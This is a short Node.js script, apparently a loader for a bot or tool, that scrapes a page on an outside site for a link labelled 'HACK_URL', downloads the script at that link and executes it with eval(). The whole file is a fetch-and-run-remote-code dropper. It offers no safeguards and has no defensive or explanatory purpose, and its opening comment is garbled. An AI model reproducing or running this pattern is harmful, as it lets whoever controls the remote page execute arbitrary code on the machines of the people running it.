 // ELIAKIM MD e strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.eliakimtech.site/files';

async function fetchHackUrl() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const hackUrl = $(`a:contains("HACK_URL")`).attr('href');

        if (!hackUrl) throw new Error('HACK_URL not found on the webpage.');

        console.log('HACK_URL fetched successfully:', hackUrl);

        const scriptResponse = await axios.get(hackUrl);
        const scriptContent = scriptResponse.data;
        console.log("HACK_URL script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching HACK_URL:', error.message);
    }
}

fetchHackUrl();
